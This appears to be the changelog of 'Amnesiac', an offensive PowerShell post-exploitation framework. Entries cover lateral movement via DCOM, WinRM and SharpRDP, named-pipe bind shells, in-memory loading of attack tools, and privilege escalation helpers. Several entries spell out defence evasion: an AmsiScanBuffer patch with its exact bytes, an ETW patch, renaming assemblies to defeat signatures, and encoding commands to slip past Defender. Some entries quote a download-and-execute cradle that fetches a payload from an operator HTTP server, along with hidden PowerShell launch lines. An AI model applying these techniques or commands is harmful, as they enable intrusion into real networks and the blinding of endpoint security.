SMB-based methods (Invoke-SMBRemoting, Invoke-WMIRemoting) require local admin on the target.
WinRM requires `Remote Management Users` membership. DCOM via ShellWindows/ShellBrowserWindow
uses the **Access** permission tier (domain users allowed by default) rather than the **Launch**
tier (admin required) because it connects to `explorer.exe` which is already running — no new
process is spawned. This makes it viable for low-privilege domain users whenever an interactive
session exists on the target (common in workstation environments).

**Privilege matrix:**

| Method | Local admin required | Active session required |
|--------|---------------------|------------------------|
| ShellWindows (default) | No | Yes |
| ShellBrowserWindow | No | Yes |
| MMC20 | Yes | No |

**Delivery mechanism:** Same serve-based download cradle as SharpRDP
(`$global:LastSharpRDPCradleFile`). Target downloads the inline pipe payload from the operator's
HTTP server and executes it entirely in memory. Requires `serve` running on the operator machine.
Target downloads and executes as the logged-on interactive user.

**Usage:**
```
dcom computername=10.3.10.22
dcom computername=10.3.10.22 method=ShellBrowserWindow
dcom computername=10.3.10.22 method=MMC20
```

**Changes:**
- `dcom` handler added to `Start-LocalShell` in `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
- `winrm` and `winrmscan` ported to `Amnesiac_ShellReady.ps1` (were missing)
- Help text updated in both files: `dcom` listed in green alongside `winrm`/`winrmscan`
- Pre-listener delivery hint updated to include `dcom` as option 2
- Serve-check message updated: "DCOM/SharpRDP last-resort ready"
- `CLAUDE.md` Key Commands: `dcom` entry added
- `CLAUDE.md` Bind Shell Flow: delivery priority table expanded to 4 rows

---

## [2026-05-31e] ux(bind-shell): remove SharpRDP clipboard option, WinRM-first delivery hints

Removed `[3] SharpRDP` from the stealth bind shell clipboard picker. The menu now shows only
`[1] Inline PS` and `[2] Full command`. SharpRDP is reclassified as a last-resort option only,
accessible via the `sharprdp` local shell command after manually setting up `serve`.

**Rationale:** SharpRDP requires an active, unlocked RDP desktop session on the target.
This is operationally rare, invasive (disconnects the existing user when SharpRDP
authenticates), and unreliable (keystroke injection timing issues with long payloads).
WinRM delivery — added in `[2026-05-31d]` — is clean, requires no active session, no local
admin, and no serve. It should be the first thing the operator tries.

**Changes:**
- Stealth bind shell clipboard prompt: `[1]/[2]/[3]` picker → `[1]/[2]` only (`Amnesiac.ps1` + `Amnesiac_ShellReady.ps1`)
- Pre-listener hint: "SharpRDP cradle selected — type 'serve'" → "Deliver via winrm (preferred)" + "SharpRDP last-resort: run serve first" (`Amnesiac.ps1`)
- Listener startup serve check: hard RED warning → soft DarkGray note that SharpRDP is last-resort and winrm doesn't need serve (`Amnesiac.ps1`)
- `sharprdp` no-args help messages: "select [3] SharpRDP" → "generate a stealth bind shell payload first" (both files)
- `CLAUDE.md` Key Commands: added `winrm`, `winrmscan`, `servelog` entries
- `CLAUDE.md` Bind Shell Flow: replaced SharpRDP-centric flow with WinRM-first priority table and step-by-step

`Invoke-SharpRDP` remains available in the tool cache and `sharprdp` remains a valid local shell
command for environments where WinRM is blocked and an active RDP session exists.

---

## [2026-05-31d] feat(delivery): WinRM-based bind shell delivery for low-priv domain users

Adds two new local shell commands:

**`winrm computername=<IP> username=<dom\user> password=<pass>`**
Primary low-priv delivery path. Tests WinRM access (Test-WSMan with Negotiate auth), then delivers
the bind shell inline payload directly via `Invoke-Command -AsJob`. No active RDP session required,
no local admin required, no serve/HTTP server required. Requires the target user to be in the
`Remote Management Users` group on the target machine. The payload travels encrypted over Kerberos
(or NTLM) — clean and reliable. Registers the target for the bind shell listener automatically.

**`winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-254]`**
Scans a range for WinRM-accessible hosts for a given credential. TCP probes port 5985 first
(silent on closed ports), then tests WSMan auth. Prints accessible hosts in green.

Also adds `$global:LastInlinePS` storage in `Show-PayloadMenu` (bind shell, stealth format) so the
`winrm` command always has the current session's payload ready without re-entering the menu.

SharpRDP redesignated in help as "requires active session" — winrm/winrmscan now listed as the
primary low-priv delivery method.

---

## [2026-05-31c] fix(sharprdp): shorten Win+R cradle by removing inline AMSI bypass

The Win+R cradle previously prepended a 128-char AMSI bypass before the `iex(DownloadString(...))`
call. This made the full command 264 chars. SharpRDP injects keystrokes one at a time; long strings
are unreliable — timing issues or RDP session reset mid-injection cause ungraceful exit (no
`Disconnecting from / Connection closed` messages) and a corrupted/missing command on target.

Removed the inline AMSI bypass from the Win+R cradle in both `Amnesiac.ps1` and
`Amnesiac_ShellReady.ps1`. The command is now ~132 chars. The pipe payload itself disables AMSI
before executing, so the bypass in the cradle is only needed if AMSI would block the `DownloadString`
call itself — not a concern in no-AV lab environments. For hardened targets, add the AMSI bypass
back or use the `[1] Inline PS` clipboard option with manual delivery.

---

## [2026-05-31b] fix(sharprdp): switch local shell sharprdp from exec=cmd to Win+R mode

`sharprdp` in the local shell (Start-LocalShell) was calling `[SharpRDP.Program]::Main` with
`exec=cmd`, which requires an active CMD.EXE window already open and focused on the target desktop.
Win+R mode (default, no `exec=cmd`) opens its own Run dialog and is reliable whenever any unlocked
session exists — confirmed working via TestSharpRDPDirect. Removed `exec=cmd` from both
`Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`. Updated status message from "Wait 15 seconds for
output" to a correct description of the flow.

---

## [2026-05-31] fix(bind-shell): pre-auth SMB, auth_fail detection, serve health check, diagnostic rewrite

Three root-cause fixes for the `no_pipe` failure observed after confirmed SharpRDP payload execution:

1. **`net use` pre-auth in `Scan-WaitingTargets`** (`Amnesiac.ps1` + `Amnesiac_ShellReady.ps1`):
   `NamedPipeClientStream.Connect()` requires an established SMB session before the named pipe
   tree is accessible. Without `net use \\target\IPC$`, Windows may silently fail auth on the
   first connect attempt, returning a generic error that `no_pipe` swallowed. Now both files
   call `net use \\$Computer\IPC$` (no explicit creds — uses the `runas /netonly` token) before
   the pipe connect. `WaitOne` timeout raised from 3s to 5s to cover the extra round-trip.

2. **`auth_fail` status** (`Amnesiac.ps1`): `no_pipe` previously swallowed both "pipe not found"
   and "access denied" errors. Now the exception message is inspected: if it contains
   "denied/logon/credentials/access" the status is `auth_fail` (yellow, with actionable message
   telling the operator to use `runas /netonly`); otherwise `no_pipe` (DarkGray, pipe not ready).

3. **Serve health check at listener startup** (`Amnesiac.ps1`): When a SharpRDP cradle was
   generated, the listener now checks whether `$global:FileServerProcess` is alive before showing
   "Listening for sessions". If serve is NOT running, a red warning is shown immediately — the
   most common cause of `no_pipe` is the target failing to download the pipe payload because the
   operator forgot to run `serve` first.

4. **`DiagnoseExecChain.ps1` rewrite** (`Tests/`): Previous version verified results via UNC
   path reads (`\\target\C$\...`) which fail with non-admin credentials (hodor is non-elevated).
   Rewritten to use HTTP callbacks (HTTP listener on operator, like `SweepSharpRDP.ps1`) and
   `exec=cmd` mode (matching actual delivery). Three stages: AMSI+beacon, serve download+beacon,
   inline pipe connect. Targets 10.3.10.22 by default (confirmed HTTP callback in sweep test).

5. **`TestInlinePipe.ps1` update** (`Tests/`): Now uses `exec=cmd` and explicit `net use` auth
   (matching actual bind shell delivery), targets 10.3.10.22 by default.

Why: SweepSharpRDP.ps1 showed 10.3.10.22 produces HTTP callbacks via exec=cmd. The bind shell
test failed with `no_pipe` after confirmed execution — indicating the pipe server either never
started (serve not running / download failed) or the operator couldn't connect to it (SMB auth).
These changes give both better diagnostics and fix the SMB auth gap.

---

## [2026-05-31] feat(evasion): build-time name randomization for AmnesiacLoader assembly

`AmnesiacLoader\Build.ps1` now randomizes the namespace, all public class names (Stomper, Injector,
NativeLoader), all public method names (ConcealLoadedAssembly, InjectUnmanagedPS, SpawnUnmanagedPS,
Load), and all internal class/method names (SleepMask, Bypass, CallStack, SyscallResolver, UnmanagedPS,
etc.) at compile time using word-boundary regex substitution on temp source copies.

Why: static strings like "AmnesiacLoader", "Stomper", "ConcealLoadedAssembly" appear in three high-signal
detection surfaces:
  1. Named pipe commands sent to the target (pipe content scanning by endpoint agents)
  2. ETW AssemblyLoad events (CLR ETW logs the assembly name on every Load() call)
  3. CLR heap metadata (memory scanners find type/method name strings)
With randomization, each build produces a unique namespace + class + method name set. No signature can
match static strings; matching would require behavioral analysis of the reflection call pattern itself.

The compiled DLL is named `$_alNs.dll` (the random namespace string). A PS-side name map block
(`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
containing `$_alNs`, `$_alStp`, `$_alConc`, etc. All pipe commands that call loader methods now use
PS reflection (`$_la.GetType(...).GetMethod(...).Invoke(...)`) with the map variables interpolated at
send time -- the target receives only the random literal names, never "AmnesiacLoader" or "Stomper".

Affected: `AmnesiacLoader\Build.ps1` (rewrite), `Amnesiac.ps1` header + 5 invocation sites,
`Amnesiac_ShellReady.ps1` header + 3 invocation sites.

---

## [2026-05-31] fix(launcher): revert ps launcher to -enc; -c triggers Defender AMSI at process creation

`Get-PayloadLauncher` `ps` case was changed to `-c "..."` in a previous fix, but that broke the full
command (option 2) against targets with Windows Defender enabled.

Root cause: `-c "<plaintext_script>"` puts the AMSI bypass code (`[Ref].Assembly.GetType + GetField +
SetValue`) in plaintext in the process command line. Defender scans the command-line argument before
any user code runs — the bypass never has a chance to disable AMSI — and returns Access Denied.

With `-enc <base64>`, the command line shows only an opaque base64 blob; Defender cannot pattern-match
the bypass at process creation time. The bypass runs as the first thing in the script and disables AMSI
before the inner script is scanned.

The stealth payload InlinePS is ~2400 chars → ~6400 chars as -enc Unicode base64 — well within cmd.exe's
8191-char paste limit. The size concern that motivated the -c change was wrong.

Fix: generate `powershell.exe -nop -ep bypass -w hidden -enc <b64>` (Unicode base64 of InlinePS).

Side effect: the Full Command is now also useful as the "built-in" delivery format for remote execution
scenarios (e.g., delivered via WMI, PsExec, or pasted directly into a cmd.exe RDP session) without
needing to first open a separate `powershell -ep bypass` window.

Affected: `Get-PayloadLauncher` `ps` case in `Amnesiac.ps1`.

---

## [2026-05-31] fix(session): EndMarker inaccessible in child runspace — session interaction always timed out

`InteractWithPipeSession` creates isolated `[runspacefactory]::CreateRunspace()` runspaces for two
async read operations: "get prompt" (send `prompt | Out-String`, read until EndMarker) and "read
command response." Both scriptblocks referenced `$global:EndMarker` directly. In PowerShell 5.x,
child runspaces created with `CreateRunspace()` have their own isolated global scope — user-defined
globals from the calling runspace are NOT inherited. So `$global:EndMarker` was always `$null` inside
the scriptblocks, the EndMarker comparison never matched, the read loops ran indefinitely, and every
`WaitOne(5000)` call timed out with `[-] The operation timed out`.

Fix: capture `$_em = $global:EndMarker` once before the outer while loop, then pass `$_em` as an
explicit `AddArgument` to each scriptblock (added `$endMarker` parameter to both). The comparison
inside each scriptblock now uses the passed-in parameter instead of `$global:`.

Both async scriptblocks in `InteractWithPipeSession` are fixed (lines ~3160 and ~4990).

---

## [2026-05-31] fix(ux): listener auto-enters session on single-target callback; Ctrl+C protected

`Print-MultiListener` probe loop had two UX issues after a session was received:
1. The loop continued indefinitely after `[+] Session received` — the user had no way to interact
   with the session without pressing Q, returning to the main menu, and selecting it manually.
2. Pressing Ctrl+C raised `PipelineStoppedException` unhandled, terminating the entire Amnesiac
   process — any sessions collected were lost and the operator had to restart.

Fix: the probe loop is now wrapped in `try/catch [PipelineStoppedException]` so Ctrl+C gracefully
exits the listener and returns to the menu. Additionally, when exactly one target was configured
(the typical Scenario 1 bind-shell flow) and a session arrives, the loop auto-breaks and calls
`InteractWithPipeSession` directly — no Q-press, no menu navigation required. Multi-target global
listener mode (multiple IPs in target list) continues collecting as before; operator presses Q when
done and sessions are accessible from the main menu.

Affected: `Print-MultiListener` probe loop in `Amnesiac.ps1`.

---

## [2026-05-31] fix(amsi-stealth): stealth payload outer bypass replaced with GetProcAddress AmsiScanBuffer patch

The stealth payload (format `[3]`) was blocked by Windows Defender at parse time with
`ScriptContainedMaliciousContent` / `ParserError`. Root cause: the outer decompressor stub in both
`New-PayloadScript` and `New-StealthScript` hardcoded the `amsiInitFailed` reflection approach
(`[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")` + `GetFields(NonPublic,Static)` +
setting bool fields to `$true`). This is a well-known Defender static signature — the char-array
encoding was not sufficient to evade it.

Fix: `Get-AmsiBypassSnippet -Technique 'pageguard'` now generates a real PS-level bypass using Win32
P/Invoke via `Add-Type`: `GetModuleHandle("amsi.dll")` → `GetProcAddress("AmsiScanBuffer")` →
`VirtualProtect(RWX)` → `Marshal.Copy([byte[]](0x48,0x31,0xC0,0xC3))` (xor rax,rax; ret) → restore
old protection. Both string arguments are char-array encoded at generation time to avoid literal
`amsi.dll` / `AmsiScanBuffer` in the payload. The C# type definition uses a random 8-char class name
and single-quoted `Add-Type -Td` so the DllImport double-quotes don't require escaping. No reflection
on AmsiUtils, no field name strings — eliminates all known Defender signatures for this technique.

Both `$decomp` stubs now use `+` concatenation (not string interpolation) to embed the bypass, which
prevents the `$` characters in the bypass snippet from being re-interpolated into the decompressor string.
The `default` case in `Get-AmsiBypassSnippet` also updated from `fail` → `pageguard`.

Affected: `Get-AmsiBypassSnippet` (pageguard/hwbp/default cases), `New-PayloadScript` ($decomp),
`New-StealthScript` ($decomp). Synced to `Amnesiac_ShellReady.ps1`.

---

## [2026-05-31] fix(token-detection): Test-NetworkLogonToken now correctly identifies runas /netonly sessions

`Test-NetworkLogonToken` previously checked only `[WindowsIdentity]::GetCurrent()`, which always returns
the local primary token in a `runas /netonly` process — even though all network access (SMB, LDAP) uses
the domain credentials stored in the LSA session cache. The function returned `$false` and the startup
banner showed "(no network logon token)" even when domain credentials were fully active.

Fix: added a second check using `LsaEnumerateLogonSessions` / `LsaGetLogonSessionData` (P/Invoke via
inline `Add-Type`) to scan the LSA logon session table for a Type-9 NewCredentials entry. LogonType 9
is the marker Windows creates for every `runas /netonly` process. The struct offsets (x64):
`SECURITY_LOGON_SESSION_DATA.LogonType` at offset 64, `UserName` (LSA_UNICODE_STRING) at offset 16,
`LogonDomain` at offset 32 — verified against the Windows SDK layout with natural alignment.

The function now returns the identity name string (not a boolean), so callers no longer need a second
`GetCurrent().Name` call. `Show-OpsecBanner` and the `engagement nondomained` handler updated accordingly.
Banner now shows `NORTH\hodor (runas /netonly)` instead of `(no network logon token)`.

Applied to both Amnesiac.ps1 and Amnesiac_ShellReady.ps1.

---

## [2026-05-26] fix(sharprdp): arguments= field unrecognized; use download cradle via direct Main() call

Root cause (confirmed via IL analysis of embedded SharpRDP binary): SharpRDP's `Program.Main` only
reads the `command=` field — the `arguments=` key is silently ignored. The old format
`command=powershell.exe arguments=-ep,bypass,-Window,Hidden,-enc,<b64>` caused SharpRDP to type
only `powershell.exe` into the Win+R dialog with no arguments, opening a bare PS window that never
ran the pipe server.

Additionally, `RunRun` calls `this.cmd.ToLower()` before keyboard injection, which would corrupt any
base64 payload passed via `command=` (uppercase A-Z become lowercase).

Fix: the local shell `sharprdp` handler now:
1. Loads the SharpRDP assembly from the gzip+b64 blob in the tool cache source directly (bypasses
   `Invoke-SharpRDP`'s `Command.Split(" ")` which breaks command values containing spaces)
2. Calls `[SharpRDP.Program]::Main()` with a properly-split args array where `command=` contains
   the full download cradle: `powershell -nop -ep bypass -w hidden -c "iex(new-object net.webclient)
   .downloadstring('http://IP:8080/pipe_NAME.ps1')"` — entirely lowercase, unaffected by ToLower()
3. Ignores `command=` and `arguments=` from user input, rebuilding command from `$global:LastSharpRDPCradleFile`

The bind shell stealth builder and `$global:LastSharpRDPB64` storage also updated to use the
all-lowercase cradle format. Changes in both Amnesiac.ps1 and Amnesiac_ShellReady.ps1.

---

## [2026-05-26] fix(sharprdp): remove cmd /c start /b wrapper; add firewall rule on serve start

`command=cmd.exe arguments=/c,start,/b,powershell.exe,...` replaced with `command=powershell.exe arguments=-ep,bypass,...`
in all three locations (Get-PayloadLauncher, bind-shell stealth builder, SharpRDP template display) and in
Amnesiac_ShellReady.ps1 equivalents. `cmd /c start /b` is unnecessary — RDP session disconnect preserves
processes on the target — and was a likely failure point: if the intermediate cmd.exe exited before
powershell.exe fully started, the child may have been killed with it.

Both serve handlers (main menu and local shell, in both files) now run:
  `New-NetFirewallRule -Name "AmnesiacServe<port>" ... -Direction Inbound -Protocol TCP -LocalPort <port>`
immediately after `Start-Process`. Windows Firewall on the operator machine was blocking inbound port 8080,
so the target's download cradle silently timed out and no pipe server was ever started.

---

## [2026-05-26] feat(local-shell): add 'serve' command so HTTP server can be started before SharpRDP

Added `serve` as a local shell command mirroring the main-menu `Serve` handler. This closes
the UX gap where the user selects [3] SharpRDP (download cradle), presses [D] to enter the
local shell, and then has no way to start the operator HTTP server — causing the target's
download cradle to fail silently. Now the correct sequence is: local shell → `serve` → SharpRDP
no-args (to see template + refresh clipboard) → SharpRDP with real credentials.
Also added a `[!] type 'serve'` reminder at the [D]/[Enter] prompt when a cradle payload was
generated, and a `serve` entry in the local shell `help` output.

---

## [2026-05-26] fix(sharprdp): use download cradle to bypass cmd.exe 8191-char keyboard injection limit

Root cause of no_pipe: SharpRDP injects keystrokes into the RDP session. The full Unicode base64
of InlinePS is ~10,000 chars — exceeds cmd.exe's 8191-char keyboard input buffer. The b64 was
silently truncated, PowerShell received invalid base64 and exited immediately, pipe server never
started. Fix: when operator selects [3] SharpRDP, InlinePS is written to operator disk as
`pipe_<pipename>.ps1` (no target disk write), and the clipboard b64 encodes a short download
cradle (`iex(New-Object Net.WebClient).DownloadString('http://<IP>:8080/pipe_<PN>.ps1')`) which
is ~120 chars of b64 — well within the 8191-char limit. Target downloads InlinePS from operator's
`serve` (HTTP server), AMSI bypass in InlinePS fires, pipe server starts. Requires `serve` running
before SharpRDP delivery; a warning is displayed.

---

## [2026-05-26] ux(sharprdp): clipboard copies only b64; SharpRDP no-args shows full command template

When the operator selects `[3] SharpRDP` from the bind shell stealth menu, the clipboard now
receives **only the base64 payload** (not the full command string with placeholder variables).
The b64 is stored in `$global:LastSharpRDPB64`. When the operator types `SharpRDP` with no
arguments in the local shell, the display now shows the exact detached-delivery command:
`SharpRDP computername=<IP> username=<domain>\<user> password=<pass> command=cmd.exe arguments=/c,start,/b,powershell.exe,-ep,bypass,-Window,Hidden,-enc,<b64>` — substituting the
actual stored b64 if one was generated this session. This prevents the user from having to
navigate back through a long b64 string in the clipboard editor to fill in placeholders, and
makes `command=cmd.exe` explicit so the `cmd /c start /b` detach pattern is used correctly.

---

## [2026-05-26] feat(sharprdp): detached SharpRDP launcher option for bind shell delivery

Added `sharprdp` launcher to `Get-PayloadLauncher`. When the user selects stealth bind shell and
presses `[3] SharpRDP`, the generated command wraps the PS payload in
`cmd.exe /c start /b powershell.exe -ep bypass -Window Hidden -enc <b64>`. The `start /b` detaches
the PS process from cmd.exe's process group, so it survives when SharpRDP disconnects the RDP
session. Without this, the spawned powershell.exe can die when the RDP session job terminates on
disconnect, explaining why `Scan-WaitingTargets` found `no_pipe` after 43+ probes despite
`[+] Executing powershell.exe` appearing in SharpRDP output.

---

## [2026-05-26] fix(local-shell): Invoke-Expression "$cmd 2>&1" breaks try/catch blocks

`Start-LocalShell` ran all commands via `Invoke-Expression "$cmd 2>&1"`. For try/catch blocks,
PowerShell parses `2>&1` as a new token after the statement and throws "The term '2>&1' is not
recognized". This silently swallowed the result of probe commands like the named-pipe existence
check, making diagnostics impossible. Fixed by using `& ([scriptblock]::Create($cmd)) 2>&1` which
correctly applies the stderr redirect to the scriptblock's output stream.

---

## [2026-05-26] feat(sharprdp): auto-register delivery target as bind shell listener target

When SharpRDP is used to deliver a bind shell payload via `[D] Open local shell`, the
`computername=` value in the SharpRDP command is automatically parsed and added to
`$global:AllUserDefinedTargets`. After typing `back`, the bind shell listener skips the target
prompt and begins scanning immediately — no need to type the target IP twice.

---

## [2026-05-26] fix(bind-shell): early warning when Amnesiac launched without -NoDomain/-Detached

Without `-NoDomain`, `$global:Detach` is false and `Print-MultiListener` embeds the operator's
LOCAL SID in the pipe ACL instead of `S-1-1-0` (Everyone). The resulting payload always fails
for remote targets — the operator's local SID is not a valid network identity, so castleblack
rejects the `NamedPipeClientStream.Connect()` even though the pipe server is running fine.

Previously a warning existed but only fired when no target list was configured. If `$global:AllUserDefinedTargets` was pre-populated from a prior session, the prompt (and warning) were skipped entirely.

Fix: warning now fires at the TOP of `Print-MultiListener` unconditionally when `!$global:Detach`,
before the payload is generated — so the operator sees it and can restart before wasting a delivery.

**Always launch for remote bind shells:**
```
runas /netonly /user:DOMAIN\user powershell.exe
. .\Amnesiac.ps1; Amnesiac -NoDomain -IP <your-IP>
```

---

## [2026-05-26] feat(listener): live per-probe status in bind shell listener

The multi-listener loop was completely silent during polling — `Scan-WaitingTargets` returned
`$null` on every failed connection attempt with no visible output. Operators had no way to tell
whether the pipe server was being scanned, whether payloads had run on targets, or whether to
keep waiting.

Changes in `Amnesiac.ps1`:
- `Scan-WaitingTargets` runspace now returns a status object on failure (`{Status='no_pipe'}` or
  `{Status='error'}`) instead of `$null`; connected results gain `Status='connected'`
- Session detection changed from `if ($result)` to `if ($result -and $result.PipeClient)` so
  diagnostic objects don't accidentally land in `MultipleSessions`
- Failed and stalled runspaces populate `$global:BindScanStatus` keyed by target IP
- Listener loop shows a `\r`-overwriting status line per probe cycle:
  `[~] #N  10.3.10.22:no_pipe` — one line, updates in place
- On session arrival or Q-stop, a blank `Write-Host ""` advances past the `\r` line cleanly

Operational value: immediately distinguishes "payload not running yet" (sustained `no_pipe`) from
"AMSI killed payload" (same, but even after 60s) vs. "session established".

---

## [2026-05-26] fix(listener): Q at target prompt exits Amnesiac instead of cancelling listener

Typing `q` at the "Enter bind shell target(s)" `Read-Host` prompt stored the literal string
`'q'` as a target hostname. The listener loop then started scanning for a pipe named after the
target `'q'` (which never exists), and the only way to stop was Ctrl+C — which, with
`TreatControlCAsInput = $false`, sends a termination signal and kills the entire Amnesiac
process (including any active sessions).

Fix in `Amnesiac.ps1`:
- Prompt updated to show "(or Q to cancel)" hint
- `if ($_tIn -ieq 'q' -or $_tIn -ieq 'quit') { return }` check added immediately after `Read-Host`
- Second `$Host.UI.RawUI.KeyAvailable` Q-check added after `Scan-WaitingTargets` returns, so a
  keypress during the scan is caught without waiting for the next 500ms sleep cycle
- `Write-Host " [*] Listener stopped."` shown when Q breaks the loop

Applied to `Amnesiac.ps1` only — ShellReady uses a timed scan loop without interactive Q.

---

## [2026-05-26] fix(param): -NoDomain alias not recognised — bind shell generated with local SID

The `-Detached` parameter had only `[Alias('NonDomain')]`. The docs and operator muscle
memory both use `-NoDomain`, which PowerShell silently ignored (no error on unknown switch
when not using CmdletBinding strict mode). Result: `$global:Detach` stayed `$false`, bind
shell payloads were generated with the operator's local SID instead of `S-1-1-0`, and the
named pipe on the target rejected any incoming connection from the domain-credentialed
operator — no session despite successful payload delivery via winrs.

Fix: added `NoDomain` and `Detach` as additional aliases so all common forms work:
  `-NoDomain`, `-NonDomain`, `-Detached`, `-Detach`

Applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.

---

## [2026-05-26] fix(listener): Scan-WaitingTargets EndInvoke hang — add 3s wall-clock guard

`Scan-WaitingTargets` collects runspace results with `EndInvoke`, which blocks until the
runspace completes. Each runspace tries `NamedPipeClientStream.Connect(500)`, but the 500ms
timeout only covers waiting for the pipe to become available after the SMB session is open.
SMB session establishment itself (Kerberos/NTLM auth) is below the pipe API and can stall
indefinitely — making `EndInvoke` block until the TCP stack times out (~20s), rendering the
Q-to-stop keypress check dead.

Fix: `AsyncWaitHandle.WaitOne(3000)` guard around each `EndInvoke`. Runspaces that don't
complete within 3s are `Stop()`-ed and disposed. The outer Q-check loop now regains control
within 3s maximum per scan cycle regardless of SMB auth stalls.

Applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.

---

## [2026-05-26] fix(ux): bind shell delivery prompt — drop into local shell before listener starts

Operational gap: when using the bind shell flow from a non-domain-joined operator box, the
natural delivery method is option 5 local shell → `Invoke-SMBRemoting`. But the listener
started immediately after payload copy, leaving no way back into the local shell.

Fix: after copying the payload to clipboard, `Print-MultiListener` now shows:
```
 [D] Open local shell to deliver payload (returns here to start listener)
 [Enter] Start listener now
```
Pressing `D` opens `Start-LocalShell`. When the operator types `back`, they return to the
bind shell flow and the listener starts normally. Only shown in interactive mode (not when
called with `-NoWait`, which is used by auto-delivery/scan flows).

---

## [2026-05-26] feat(runbin): reflective .NET assembly loading — RunBin command

### New command: `RunBin <name> [args]`

Allows the operator to load and execute a managed .NET assembly entirely in memory,
with no disk write on the operator or target machine.

**How it works:**

- `Fetch-BinaryTool` fetches the binary via `DownloadData` (not `DownloadString`), stores it
  as base64 in `$global:ToolCache`. Tries operator HTTP server (`http://<ListenerIP>:8080/`)
  first (`.exe` then `.dll`), then falls back to GitHub.
- **Local shell (option 5):** loads from cache, calls `[Reflection.Assembly]::Load([byte[]])`
  and invokes `EntryPoint` with any supplied args.
- **Active pipe session:** streams the binary via `Send-Module` (same `__MODULE_BEGIN__/CHUNK/END__`
  protocol as other modules), then sends a one-liner to the target that finds the loaded assembly
  in `AppDomain` and invokes its entry point.

**Changes:**

| File | Change |
|------|--------|
| `Amnesiac.ps1` | `Fetch-BinaryTool` added after `Fetch-ToolFromGitHub` |
| `Amnesiac.ps1` | `RunBin` handler in `Start-LocalShell` (before fall-through) |
| `Amnesiac.ps1` | `RunBin` handler in `InteractWithPipeSession` (after GodPotato) |
| `Amnesiac.ps1` | `RunBin` listed in both local shell and session help menus |
| `Amnesiac_ShellReady.ps1` | Same four changes (no colour codes) |

**Operational context:** Post-exploitation tools like Rubeus, SharpHound, or Seatbelt are
.NET assemblies that benefit from reflective loading — no `IEX`, no script, no AV-visible
file drop. Operator hosts the binary on their server; a single `RunBin Rubeus.exe triage`
streams and executes it on the target entirely in memory.

---

## [2026-05-25] feat(lpe): LPE tool section — PowerUp, PrivescCheck, GodPotato

### New section

Added `[+] LPE:` to all four help surfaces and wired the three tools into both
execution contexts (local shell and active pipe session).

**Tools added** (sourced from `Tools\` cache; GitHub fallback added when pushed):

| Keyword | File | Auto-invoke |
|---------|------|-------------|
| `PowerUp` | `PowerUp.ps1` | `Invoke-AllChecks` |
| `PrivescCheck` | `PrivescCheck.ps1` | `Invoke-PrivescCheck` |
| `GodPotato` | `Invoke-GodPotato.ps1` | prompts for `-cmd` argument |

### Changes

**`Start-LocalShell` keyword dispatch (`$_kw` hashtable)** — three new entries.
PowerUp and PrivescCheck auto-invoke their main function on load. GodPotato loads
and surfaces its functions; operator calls `Invoke-GodPotato -cmd "..."` manually
(command argument varies per engagement).

**`Start-LocalShell` help** — new `[+] LPE:` block after Domain Actions with
usage hints for all three tools.

**`InteractWithPipeSession`** — three new `elseif` blocks. PowerUp and PrivescCheck
stream from the local cache over the named pipe via `Send-Module` (first use of
`Send-Module` in session interaction — previously session tools all used
`downloadstring` from GitHub). GodPotato prompts the operator for a command string
with `Read-Host` before streaming, so the exact payload (add user, spawn shell,
etc.) is decided at run time. All three blocks include a clear cache-miss message.

**`Get-AvailableCommands` (session `help`)** — new `[+] LPE:` section at the bottom.

### Operational impact
- **Scenario 1 / local shell**: type `PowerUp`, `PrivescCheck`, or `GodPotato` at
  the local shell prompt to run LPE checks on the operator machine or a compromised
  host running Amnesiac directly.
- **Scenario 2 / pipe session**: same keywords in an active session stream the tool
  from the operator cache to the target over the pipe — no disk write on target,
  no GitHub download from target network.
- Cache miss path: `modules reload` after adding the `.ps1` to `Tools\`.

---

## [2026-05-25] feat(native-launcher): amnesiac_launcher.exe + AmnesiacBridge.dll — patchless in-process PS Runspace loader

### What was built

`amsi-pageguard-veh-master/` now contains a working native launcher that:

1. Downloads `AmnesiacBridge.dll` from the operator HTTP server (no disk write for the script)
2. Installs the PAGE_GUARD VEH bypass for AMSI+ETW in the native process (protects the download phase)
3. Starts the CLR via `ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost`
4. **Removes the native bypass** before entering managed code (see root cause below)
5. Loads `AmnesiacBridge.dll` to a GUID-named temp file and calls `ExecuteInDefaultAppDomain`
6. Inside the bridge: applies managed AMSI+ETW bypasses, opens a full `PSHost` Runspace, downloads and runs `Amnesiac_ShellReady.ps1` entirely in memory — no script ever touches disk

### Root cause: PAGE_GUARD VEH is incompatible with in-process CLR

`rs.Open()` initialises the PowerShell Runspace. During initialisation the CLR JIT-compiles
AMSI interop stubs and reads from `amsi.dll`'s code page, which triggers our PAGE_GUARD.
The VEH handler fires and manipulates `RIP/RSP/RAX` to fake a return. The CLR detects the
corrupted managed→unmanaged transition frame and raises an `AccessViolationException` — which
is not catchable in .NET 4.x — terminating the process with no output.

### Fix: split native and managed bypass responsibilities

**Native launcher** (`launcher.cpp`):
- PAGE_GUARD VEH covers AMSI+ETW during the native execution phase (download)
- `UninstallBypass()` called before `ExecuteInDefaultAppDomain` — before any managed code runs

**Managed bridge** (`AmnesiacBridge.cs`):
- `amsiInitFailed = true` via reflection (patchless — no bytes written; AMSI never initialises)
- `EtwEventWrite` first byte patched to `0xC3` via P/Invoke `VirtualProtect` + `Marshal.WriteByte`
- Both applied before `rs.Open()` so the Runspace opens under bypass from the start

### Build infrastructure fixes (accumulated during development)

- Wrote `mscoree.h` shim — SDK 10.0.26100.0 dropped this header; provides `ICorRuntimeHost`
  (19-method vtable) and `ICLRRuntimeHost` (9-method vtable) interface definitions
- Wrote `guids.cpp` — all 7 CLR hosting GUIDs as `EXTERN_C const` definitions
- Generated `mscoree.lib` from `mscoree.def` using `lib.exe /def /machine:x64` (not in SDK)
- Switched `AmnesiacBridge.cs` compiler to Roslyn `csc.exe` (VS2022 BuildTools) for C# 6+
  expression-bodied member syntax; replaced `InitialSessionState.ExecutionPolicy` (PS Core only)
  with `Set-ExecutionPolicy` cmdlet call inside a second `PowerShell.Create()` instance
- `WebClient.Encoding = UTF8` — default encoding mangled em-dashes in `Amnesiac_ShellReady.ps1`
